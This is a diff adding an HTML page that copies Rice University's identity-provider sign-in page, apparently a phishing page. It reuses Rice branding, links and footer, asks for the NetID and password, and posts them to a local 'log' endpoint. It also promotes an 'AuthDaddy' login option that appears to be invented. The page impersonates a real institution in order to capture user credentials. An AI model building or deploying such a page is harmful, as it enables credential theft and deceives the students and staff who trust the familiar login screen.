@@ -1,0 +1,94 @@
+
+<!DOCTYPE html>
+<html>
+  	<head>
+    	<meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    	<title>Rice Identity Provider</title>
+    	<link rel="stylesheet" type="text/css" href="main.css">
+        <script src="script.js" defer=""></script>
+  	</head>
+  	<body>
+    <div class="wrapper">
+      <div class="container">
+        <div id="rice_header" >
+          <div id="rice_logo">
+            <a href="http://www.rice.edu">
+              <img src="images/RiceLogo_small.png" alt="Rice University logo">
+            </a>
+          </div>
+          <div id="rice_title">Rice Identity Provider</div>
+        </div>
+
+        <div class="content" style="width: 100%;">
+          <div class="column one">
+
+
+            <form action="log" method="post">
+
+                <legend class="form-button">
+Login with Duo 
+                </legend>
+                <legend id="login" class="form-button emphasisDiv">
+Login with AuthDaddy
+                </legend>
+
+              <div class="form-element-wrapper">
+                <label for="username">NetID</label>
+                <input class="form-element form-field" id="username" name="j_username" type="text"
+                	value="" autofocus>
+              </div>
+
+              <div class="form-element-wrapper">
+                <label for="password">Password</label>
+                <input class="form-element form-field" id="password" name="j_password" type="password" value="">
+              </div>
+
+                            <div class="form-element-wrapper">
+                <input type="checkbox" name="donotcache" value="1"> Always login with AuthDaddy
+              </div>
+
+
+<!-- Uncomment this when attribute consent is enabled
+              <div class="form-element-wrapper">
+                <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
+Clear prior granting of permission for release of your information to this service.              </div>
+-->
+
+              <a href="./login.html"><div class="form-element-wrapper">
+                <button class="form-element form-button" type="submit" name="_eventId_proceed"><a style="color: white;" href="./login.html">Login</a></button>
+              </div></a>
+
+            </form>
+
+			
+              <img src= "https&#x3a;&#x2f;&#x2f;www.rice.edu&#x2f;sites&#x2f;g&#x2f;files&#x2f;bxs2566&#x2f;files&#x2f;2020-02&#x2f;esther-text-only.png"
+                  alt="Esther">
+          </div>
+          <div class="column two">
+            <ul class="list list-help">
+                <li class="list-help-item"><a href="https://esther1.rice.edu" class="form-element form-button" style="color:white;padding-left:10px;text-align:center;">ESTHER PIN Login</a></li>
+                <li class="list-help-item"><a href="https://mynetid.rice.edu"><span class="item-marker">&rsaquo;</span> Forgot your NetID Password?</a></li>
+                <li class="list-help-item"><a href="https://helpdesk.rice.edu"><span class="item-marker">&rsaquo;</span> Need Help?</a></li>
+            </ul>
+          </div>
+          <div class="pop" id="info">
+            <p class="prompt-heading">Authenticating through AuthDaddy is easy:</p>
+            <ul class="list list-help" style="margin: 0; color: #00246A;">
+            <li class="prompt">Haven't registered with AuthDaddy</li>
+            <li class="list-help-item"><a href="https://helpdesk.rice.edu"><span class="item-marker">&rsaquo;</span> Register Now!</a></li>
+            <li class="prompt">Already set up AuthDaddy?</li>
+            <li class="list-help-item"><a href="https://helpdesk.rice.edu"><span class="item-marker">&rsaquo;</span> Enter your email and password like usual.</a></li>
+        </ul></div>
+        </div>
+      </div>
+
+      <footer>
+        <div class="container container-footer">
+          <p class="footer-text">6100 Main St., Houston, TX 77005-1892<br>Mailing Address: P.O. Box 1892, Houston, TX 77251-1892</p>
+        </div>
+      </footer>
+    </div>
+    
+ 	</body>
+</html>
